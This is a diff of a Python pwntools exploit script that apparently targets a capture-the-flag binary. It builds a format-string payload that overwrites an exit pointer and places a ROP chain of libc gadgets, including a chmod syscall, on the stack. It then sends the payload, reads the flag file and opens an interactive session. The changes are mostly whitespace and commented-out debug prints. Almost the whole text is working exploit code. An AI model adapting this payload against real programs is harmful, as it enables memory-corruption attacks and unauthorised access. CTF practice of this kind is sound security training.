@@ -89,7 +89,7 @@ base = libc_base
 # exit_loc = base + 0x46a40 # exit offset from libc objdump
 # exit_loc = rip_func_addr - 46494429499512
 
-print(f"base + 0x578c8 : 0x{base + 0x578c8:x}")
+print(f"base+0x578c8 : 0x{base+0x578c8:x}")
 print(f"base + pop_rdi : 0x{base + pop_rdi:x}")
 print(f"base + 0x1eb1f3 : 0x{base + 0x1eb1f3:x}")
 print(f"base + pop_rsi : 0x{base + pop_rsi:x}")
@@ -102,11 +102,9 @@ print(f"base + 0x2284d : 0x{base + 0x2284d:x}")
 exit_loc = leaked_binary_base + 0x4060
 print(f"exit address : 0x{exit_loc:x}")
 base = libc_base
-# new_rsp = rsp_func
-new_rsp =  rip_func_addr
-
+new_rsp = rsp_func
 p2 = b"A"*2 + fmtstr_payload(43, {
-    exit_loc : p64(base + 0x578c8).ljust(8, b"\x00"),
+    exit_loc : p64(base+0x578c8).ljust(8, b"\x00"),
     new_rsp : p64(base + pop_rdi).ljust(8, b"\x00"),
     new_rsp + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
     new_rsp + 16 : p64(base + pop_rsi).ljust(8, b"\x00"),
@@ -116,17 +114,17 @@ p2 = b"A"*2 + fmtstr_payload(43, {
     new_rsp + 48 : p64(base + pop_rax).ljust(8, b"\x00"),
     new_rsp + 56 : p64(0x5a),
     new_rsp + 64 : p64(base + 0x2284d).ljust(8, b"\x00")
-    }, numbwritten=40,  write_size='short', strategy='fast')
+    }, numbwritten=40, write_size='short', strategy='fast')
 
-print("first")
-print(io.recvline())
-print(io.recvline())
-print(io.recvline())
+# print("first")
+# print(io.recvline())
+# print(io.recvline())
+# print(io.recvline())
 io.sendline(p2)
-print("second")
-print(io.recvline())
-print(io.recvline())
-print(io.recv())
+# print("second")
+# print(io.recvline())
+# print(io.recvline())
+# print(io.recv())
 system("cat /flag")
 io.interactive()
 
